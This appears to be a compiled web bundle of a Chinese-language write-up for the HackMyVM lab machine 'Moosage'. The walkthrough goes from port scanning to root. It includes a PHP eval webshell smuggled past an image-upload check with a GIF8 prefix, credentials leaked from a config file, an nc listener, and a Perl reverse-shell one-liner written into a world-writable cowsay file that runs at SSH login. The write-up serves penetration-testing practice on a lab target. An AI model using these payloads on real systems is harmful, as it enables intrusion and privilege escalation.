"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[3991],{29596:(e,n,o)=>{o.r(n),o.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>d,frontMatter:()=>a,metadata:()=>c,toc:()=>i});var t=o(85893),r=o(11151);const a={},s="Moosage",c={id:"HackMyVM/Machines/Moosage/index",title:"Moosage",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Moosage/index.md",sourceDirName:"HackMyVM/Machines/Moosage",slug:"/HackMyVM/Machines/Moosage/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Moosage/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Moosage/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Locker",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Locker/"},next:{title:"Nebula",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Nebula/"}},l={},i=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"<code>/blog</code> \u8def\u7531",id:"blog-\u8def\u7531",level:3},{value:"\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u90e8\u7f72 webshell",id:"\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u90e8\u7f72-webshell",level:2},{value:"User - www-data",id:"user---www-data",level:2},{value:"mysql \u6570\u636e\u5e93",id:"mysql-\u6570\u636e\u5e93",level:3},{value:"User - baca",id:"user---baca",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u901a\u8fc7 SSH \u767b\u5f55",id:"\u901a\u8fc7-ssh-\u767b\u5f55",level:3},{value:"SSH \u811a\u672c\u6ce8\u5165",id:"ssh-\u811a\u672c\u6ce8\u5165",level:2},{value:"User - root",id:"user---root",level:2},{value:"flag - user",id:"flag---user-1",level:3}];function p(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,r.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"moosage",children:"Moosage"}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-04-26"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // b26a6125972ea8b288767842e0c22aa3"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 22"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 23"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and fun."})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.126\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.126\nHost is up (0.00047s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 02:65:e6:05:af:c8:81:9c:30:b0:da:e3:1e:d8:be:02 (RSA)\n|   256 3f:7d:4b:86:8d:c7:01:8f:b3:56:6d:65:c2:e5:cf:4e (ECDSA)\n|_  256 8e:d4:b8:d6:8e:d9:61:a1:3e:7f:5e:d7:ec:dc:bb:de (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: 403 Forbidden\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,t.jsxs)(n.p,{children:["\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee ",(0,t.jsx)(n.code,{children:"/"})," \u8def\u7531\uff0c\u7f51\u7ad9\u8fd4\u56de"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"403 Forbidden\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834\uff0c\u5f97\u5230"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"[15:55:41] 301 -  185B  - /blog  ->  http://192.168.56.126/blog/\n[15:55:41] 200 -   10KB - /blog/\n"})}),"\n",(0,t.jsxs)(n.h3,{id:"blog-\u8def\u7531",children:[(0,t.jsx)(n.code,{children:"/blog"})," \u8def\u7531"]}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834\uff0c\u5f97\u5230"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"200      GET      213l      403w     3891c http://192.168.56.126/blog/static/styles/lightbox.css\n200      GET      292l      921w     7770c http://192.168.56.126/blog/static/scripts/autosize.js\n200      GET       10l       27w     1404c http://192.168.56.126/blog/static/images/profile.jpg\n200      GET      198l      440w     4317c http://192.168.56.126/blog/static/scripts/datepick.js\n200      GET        4l       10w      438c http://192.168.56.126/blog/static/images/zpEYXu5Wdu6.png\n301      GET        7l       12w      185c http://192.168.56.126/blog/app => http://192.168.56.126/blog/app/\n200      GET     1293l     2393w    23974c http://192.168.56.126/blog/static/styles/theme02.css\n200      GET      140l      288w     2330c http://192.168.56.126/blog/static/styles/main.css\n301      GET        7l       12w      185c http://192.168.56.126/blog/data => http://192.168.56.126/blog/data/\n200      GET       83l      105w     1026c http://192.168.56.126/blog/static/styles/highlight-monokai-sublime.css\n200      GET     1102l     2150w    25882c http://192.168.56.126/blog/static/scripts/app.js\n200      GET       14l       61w     3142c http://192.168.56.126/blog/static/images/profile_big.jpg\n200      GET      508l     1672w    18089c http://192.168.56.126/blog/static/scripts/lightbox.js\n200      GET       44l     3937w   100276c http://192.168.56.126/blog/static/scripts/highlight-10.1.2.min.js\n200      GET        4l     1292w    86351c http://192.168.56.126/blog/static/scripts/jquery.min.js\n200      GET      268l      683w    10091c http://192.168.56.126/blog/\n301      GET        7l       12w      185c http://192.168.56.126/blog/static/scripts => http://192.168.56.126/blog/static/scripts/\n403      GET        7l       10w      169c http://192.168.56.126/blog/static/\n301      GET        7l       12w      185c http://192.168.56.126/blog/static/images => http://192.168.56.126/blog/static/images/\n301      GET        7l       12w      185c http://192.168.56.126/blog/static => http://192.168.56.126/blog/static/\n403      GET        7l       10w      169c http://192.168.56.126/blog/static/scripts/\n403      GET        7l       10w      169c http://192.168.56.126/blog/static/images/\n301      GET        7l       12w      185c http://192.168.56.126/blog/static/styles => http://192.168.56.126/blog/static/styles/\n403      GET        7l       10w      169c http://192.168.56.126/blog/static/styles/\n301      GET        7l       12w      185c http://192.168.56.126/blog/app/db => http://192.168.56.126/blog/app/db/\n301      GET        7l       12w      185c http://192.168.56.126/blog/app/lang => http://192.168.56.126/blog/app/lang/\n301      GET        7l       12w      185c http://192.168.56.126/blog/app/db/mysql => http://192.168.56.126/blog/app/db/mysql/\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u4e0d\u5e38\u89c1\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.126/blog/static/images/zpEYXu5Wdu6.png\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5c1d\u8bd5\u5339\u914d\u76f8\u5173\u5f00\u6e90\u4ed3\u5e93\u4e2d\u7684\u4ee3\u7801\uff0c\u627e\u5230 ",(0,t.jsx)(n.a,{href:"https://github.com/m1k1o/blog/",children:"m1k1o/blog: Lightweight self-hosted facebook-styled PHP blog."})]}),"\n",(0,t.jsx)(n.p,{children:"\u627e\u5230\u4e00\u4efd\u914d\u7f6e\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.126/blog/config.ini"',children:'[database]\ndb_connection = sqlite\n;sqlite_db = data/sqlite.db\n\n;[database]\ndb_connection = mysql\nmysql_socket = /run/mysqld/mysqld.sock\nmysql_host = localhost\nmysql_port = 3306\nmysql_user = baca\nmysql_pass = youareinsane\ndb_name = moosage\n\n[profile]\ntitle = Blog\nname = Max Musermann\npic_small = static/images/profile.jpg\npic_big = static/images/profile_big.jpg\n;cover = static/images/cover.jpg\n\n[language]\nlang = en\n\n[components]\nhighlight = true\n\n[custom]\ntheme = theme02\n;header = data/header.html\n;styles[] = static/styles/custom1.css\n;styles[] = static/styles/custom2.css\n;scripts = static/styles/scripts.css\n\n[bbcode]\n;bbtags[quote] = "<quote>{param}</quote>"\n\n[admin]\nforce_login = true\nnick = demo\npass = demo\n\n[friends]\n;friends[user] = pass\n;friends[user] = pass\n\n[directories]\nimages_path = data/i/\nthumbnails_path = data/t/\nlogs_path = data/logs/\n\n[proxy]\n;proxy = hostname:port\n;proxyauth = username:password\n;proxytype = CURLPROXY_HTTP ; default, if not set\n;proxytype = CURLPROXY_SOCKS4\n;proxytype = CURLPROXY_SOCKS5\n\n;URL_PREFIX type:\n;proxy = http://your.page.com/proxy.cgi?\n;proxyauth = username:password\n;proxytype = URL_PREFIX\n\n[system]\n;timezone = Europe/Vienna\nsystem_name = blog\nversion = 1.3\ndebug = false\nlogs = false\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u627e\u5230\u4e86\u4e00\u4efd\u6570\u636e\u5e93\u51ed\u636e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"baca:youareinsane\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u540c\u65f6\u8fd8\u6709\u7f51\u7ad9 admin \u6743\u9650\u7684\u51ed\u636e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"demo:demo\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u90e8\u7f72-webshell",children:"\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u90e8\u7f72 webshell"}),"\n",(0,t.jsx)(n.p,{children:"\u53d6\u5f97 admin \u6743\u9650\u4e4b\u540e\uff0c\u53d1\u73b0\u6587\u7ae0\u7f16\u8f91\u7684\u754c\u9762\u5b58\u5728\u4e0a\u4f20\u56fe\u7247\u7684\u529f\u80fd\uff0c\u5c1d\u8bd5\u4e0a\u4f20 php \u6587\u4ef6"}),"\n",(0,t.jsx)(n.p,{children:"\u9996\u5148\uff0c\u524d\u7aef\u5bf9\u6587\u4ef6\u7c7b\u578b\u505a\u4e86\u68c0\u6d4b\uff0c\u5982\u679c\u662f\u975e\u56fe\u7247\u6587\u4ef6\u5c31\u4f1a\u8fd4\u56de"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintyext",children:"Only images can be uploaded.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u56fe\u7247\u540e\u7f00\u540d\u8fdb\u884c\u4e0a\u4f20 webshell \u7684\u8bdd\uff0c\u5219\u4f1a\u8fd4\u56de"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:'POST /blog/ajax.php?action=upload_image HTTP/1.1\nHost: 192.168.56.126\nContent-Length: 220\nAccept: application/json, text/javascript, */*; q=0.01\nCsrf-Token: 2bcce878a8\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary8sP27qQBgBO4GBPd\nOrigin: http://192.168.56.126\nReferer: http://192.168.56.126/blog/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=tpvhqhfhbehp1sg4tk0od9s2pn\nConnection: close\n\n------WebKitFormBoundary8sP27qQBgBO4GBPd\nContent-Disposition: form-data; name="file"; filename="webshell.php.png"\nContent-Type: image/png\n\n<?php @eval($_POST[\'shell\']) ?>\n------WebKitFormBoundary8sP27qQBgBO4GBPd--\n\n\nHTTP/1.1 200 OK\nServer: nginx/1.14.2\nDate: Sun, 03 Mar 2024 08:56:48 GMT\nContent-Type: application/json\nConnection: close\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nContent-Length: 47\n\n{"error":true,"msg":"File is not valid image."}\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"GIF8"})," \u4f5c\u4e3a\u6587\u4ef6\u5f00\u5934\u8fdb\u884c\u4e0a\u4f20"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:'POST /blog/ajax.php?action=upload_image HTTP/1.1\nHost: 192.168.56.126\nContent-Length: 220\nAccept: application/json, text/javascript, */*; q=0.01\nCsrf-Token: 2bcce878a8\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjq6FmbKJJ3r1PCcW\nOrigin: http://192.168.56.126\nReferer: http://192.168.56.126/blog/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=tpvhqhfhbehp1sg4tk0od9s2pn\nConnection: close\n\n------WebKitFormBoundaryjq6FmbKJJ3r1PCcW\nContent-Disposition: form-data; name="file"; filename="webshell.php.png"\nContent-Type: image/png\n\nGIF8<?php @eval($_POST[\'shell\']) ?>\n------WebKitFormBoundaryjq6FmbKJJ3r1PCcW--\n\n\nHTTP/1.1 200 OK\nServer: nginx/1.14.2\nDate: Sun, 03 Mar 2024 08:58:38 GMT\nContent-Type: application/json\nConnection: close\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nContent-Length: 56\n\n{"path":"data\\/i\\/3BXa.php","thumb":"data\\/t\\/3BXa.php"}\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u4e0a\u4f20\u4e86 webshell\uff0c\u5e76\u4e14\u80fd\u591f\u6210\u529f\u89e3\u6790"}),"\n",(0,t.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ nc -lvnp 9999\nlistening on [any] 9999 ...\nconnect to [192.168.56.102] from (UNKNOWN) [192.168.56.126] 34714\nwhoami\nwww-data\n"})}),"\n",(0,t.jsx)(n.h3,{id:"mysql-\u6570\u636e\u5e93",children:"mysql \u6570\u636e\u5e93"}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u4e0a\u6587\u53d1\u73b0\u7684 mysql \u6570\u636e\u5e93\u51ed\u636e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"baca:youareinsane\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"MariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| moosage            |\n+--------------------+\n\nMariaDB [moosage]> select * from images,posts;\n+----+------------------+-----------------+-----------------+------+----------------------------------+---------------------+--------+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+\n| id | name             | path            | thumb           | type | md5                              | datetime            | status | id | text        | plain_text  | feeling | persons | location | content | content_type | privacy | datetime            | status |\n+----+------------------+-----------------+-----------------+------+----------------------------------+---------------------+--------+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+\n|  1 | webshell.php.png | NULL            | NULL            | png  | ecca200f22ffc0aeafced51271806e2c | 2024-03-03 03:55:14 |      0 |  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |\n|  2 | webshell.php.png | NULL            | NULL            | png  | ecca200f22ffc0aeafced51271806e2c | 2024-03-03 03:56:48 |      0 |  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |\n|  3 | webshell.php     | data/i/3BXa.php | data/t/3BXa.php | php  | 2a0d8dc341c5021211ad4b717ff113a2 | 2024-03-03 03:58:38 |      1 |  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |\n+----+------------------+-----------------+-----------------+------+----------------------------------+---------------------+--------+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u672a\u53d1\u73b0\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,t.jsx)(n.h2,{id:"user---baca",children:"User - baca"}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u4e0a\u6587\u53d1\u73b0\u7684 mysql \u51ed\u636e\u8fdb\u884c\u767b\u5f55"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@moosage:/var/www/html/blog/data/i$ su baca\nPassword:\nbaca@moosage:/var/www/html/blog/data/i$ whoami\nbaca\n"})}),"\n",(0,t.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"baca@moosage:~$ cat user.txt\nhmvmessageme\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u901a\u8fc7-ssh-\u767b\u5f55",children:"\u901a\u8fc7 SSH \u767b\u5f55"}),"\n",(0,t.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u521b\u5efa\u6587\u4ef6\u5939\uff0c\u5e76\u5199\u5165 ",(0,t.jsx)(n.code,{children:"authorized_keys"})," \u6587\u4ef6"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) baca@moosage:/home/baca$ mkdir .ssh\n(remote) baca@moosage:/home/baca$ chmod 700 .ssh\n(remote) baca@moosage:/home/baca$ nano .ssh/authorized_keys\n(remote) baca@moosage:/home/baca$ cat .ssh/authorized_keys\n......\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u968f\u540e\u5c1d\u8bd5\u8fdb\u884c\u8fde\u63a5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ ssh baca@192.168.56.126\n ___________________________\n<WELCOME TO MOOSAGE SYSTEM>\n ---------------------------\n     \\\n      \\\n        ,__, |    |\n        (oo)\\|    |___\n        (__)\\|    |   )\\_\n             |    |_w |  \\\n             |    |  ||   *\n\n             Cower....\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Mar  3 04:29:55 2024 from 192.168.56.102\nbaca@moosage:~$ whoami\nbaca\n"})}),"\n",(0,t.jsx)(n.h2,{id:"ssh-\u811a\u672c\u6ce8\u5165",children:"SSH \u811a\u672c\u6ce8\u5165"}),"\n",(0,t.jsxs)(n.p,{children:["\u89c2\u5bdf SSH \u767b\u9646\u754c\u9762\u7684\u6b22\u8fce\u8bed\uff0c\u53ef\u4ee5\u8054\u60f3\u5230\u8fd9\u4e2a\u5de5\u5177 ",(0,t.jsx)(n.code,{children:"Cowsay"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u67e5\u770b ",(0,t.jsx)(n.code,{children:"Cowsay"})," \u7a0b\u5e8f\u7684\u811a\u672c\u8def\u5f84 ",(0,t.jsx)(n.code,{children:"/usr/share/cowsay/cows"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"-rw-rw-rw- 1 root root  115 Feb  3  2019 apt.cow\n-rw-rw-rw- 1 root root  310 Aug 14  1999 bud-frogs.cow\n-rw-rw-rw- 1 root root  123 Aug 14  1999 bunny.cow\n-rw-rw-rw- 1 root root 1.2K Feb  3  2019 calvin.cow\n-rw-rw-rw- 1 root root  480 Aug 14  1999 cheese.cow\n-rw-rw-rw- 1 root root  181 Feb  3  2019 cock.cow\n-rw-rw-rw- 1 root root  230 Aug 14  1999 cower.cow\n-rw-rw-rw- 1 root root  569 Aug 14  1999 daemon.cow\n-rw-rw-rw- 1 root root  175 Aug 14  1999 default.cow\n-rw-rw-rw- 1 root root 1.3K Nov  3  1999 dragon-and-cow.cow\n-rw-rw-rw- 1 root root 1000 Aug 14  1999 dragon.cow\n-rw-rw-rw- 1 root root  132 Feb  3  2019 duck.cow\n-rw-rw-rw- 1 root root  284 Aug 14  1999 elephant.cow\n-rw-rw-rw- 1 root root  357 Feb  3  2019 elephant-in-snake.cow\n-rw-rw-rw- 1 root root  585 Aug 14  1999 eyes.cow\n-rw-rw-rw- 1 root root  490 Aug 14  1999 flaming-sheep.cow\n-rw-rw-rw- 1 root root 1018 Aug 14  1999 ghostbusters.cow\n-rw-rw-rw- 1 root root 1.1K Feb  3  2019 gnu.cow\n-rw-rw-rw- 1 root root  126 Aug 14  1999 hellokitty.cow\n-rw-rw-rw- 1 root root  687 Feb  3  2019 kangaroo.cow\n-rw-rw-rw- 1 root root  637 Aug 14  1999 kiss.cow\n-rw-rw-rw- 1 root root  162 Aug 14  1999 koala.cow\n-rw-rw-rw- 1 root root  406 Aug 14  1999 kosh.cow\n-rw-rw-rw- 1 root root  226 Feb  3  2019 luke-koala.cow\n-rw-rw-rw- 1 root root  814 Feb  3  2019 mech-and-cow.cow\n-rw-rw-rw- 1 root root  439 Aug 14  1999 milk.cow\n-rw-rw-rw- 1 root root  249 Feb  3  2019 moofasa.cow\n-rw-rw-rw- 1 root root  203 Aug 14  1999 moose.cow\n-rw-rw-rw- 1 root root 1.6K Feb  3  2019 pony.cow\n-rw-rw-rw- 1 root root  305 Feb  3  2019 pony-smaller.cow\n-rw-rw-rw- 1 root root  252 Aug 14  1999 ren.cow\n-rw-rw-rw- 1 root root  234 Aug 14  1999 sheep.cow\n-rw-rw-rw- 1 root root  433 Aug 14  1999 skeleton.cow\n-rw-rw-rw- 1 root root  283 Feb  3  2019 snowman.cow\n-rw-rw-rw- 1 root root  854 Aug 14  1999 stegosaurus.cow\n-rw-rw-rw- 1 root root  364 Aug 14  1999 stimpy.cow\n-rw-rw-rw- 1 root root  229 Feb  3  2019 suse.cow\n-rw-rw-rw- 1 root root  293 Aug 14  1999 three-eyes.cow\n-rw-rw-rw- 1 root root 1.3K Aug 14  1999 turkey.cow\n-rw-rw-rw- 1 root root 1.1K Aug 14  1999 turtle.cow\n-rw-rw-rw- 1 root root  215 Nov 12  1999 tux.cow\n-rw-rw-rw- 1 root root 1.7K Feb  3  2019 unipony.cow\n-rw-rw-rw- 1 root root  365 Feb  3  2019 unipony-smaller.cow\n-rw-rw-rw- 1 root root  279 Aug 14  1999 vader.cow\n-rw-rw-rw- 1 root root  213 Aug 14  1999 vader-koala.cow\n-rw-rw-rw- 1 root root  248 Aug 14  1999 www.cow\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5e76\u4e14\u901a\u8fc7\u591a\u6b21\u767b\u5f55\uff0c\u53d1\u73b0 SSH \u6b22\u8fce\u754c\u9762\u4e0a\u59cb\u7ec8\u90fd\u662f ",(0,t.jsx)(n.code,{children:"cower.cow"})," \u811a\u672c\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 ",(0,t.jsx)(n.code,{children:"cower.cow"})," \u811a\u672c\uff0c\u4ece\u800c\u5b9e\u73b0\u901a\u8fc7 SSH \u8c03\u7528 ",(0,t.jsx)(n.code,{children:"Cowsay"})," \u7684\u8fc7\u7a0b\u5f97\u5230 ",(0,t.jsx)(n.code,{children:"root"})," \u6743\u9650"]}),"\n",(0,t.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,t.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u5c06\u6076\u610f\u8f7d\u8377\u690d\u5165 ",(0,t.jsx)(n.code,{children:"cower.cow"})]}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:".cow"})," \u811a\u672c\u6587\u4ef6\u5b9e\u8d28\u4e0a\u662f ",(0,t.jsx)(n.code,{children:"perl"})," \u811a\u672c"]})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'(remote) baca@moosage:/usr/share/cowsay/cows$ echo "" > cower.cow\n(remote) baca@moosage:/usr/share/cowsay/cows$ echo \'use Socket;$i="192.168.56.102";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\' > cower.cow\n(remote) baca@moosage:/usr/share/cowsay/cows$ cat cower.cow\nuse Socket;$i="192.168.56.102";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u7136\u540e\u542f\u52a8 SSH \u4f1a\u8bdd"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"ssh baca@192.168.56.126\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 1234\n[19:53:32] Welcome to pwncat \ud83d\udc08!\n[19:54:27] received connection from 192.168.56.126:57164\n[19:54:28] 192.168.56.126:57164: registered new host w/ db\n(local) pwncat$ back\n(remote) root@moosage:/# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h3,{id:"flag---user-1",children:"flag - user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) root@moosage:/root# cat root.txt\nhmvyougotmooooooo\n"})})]})}function d(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(p,{...e})}):p(e)}},11151:(e,n,o)=>{o.d(n,{Z:()=>c,a:()=>s});var t=o(67294);const r={},a=t.createContext(r);function s(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:s(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);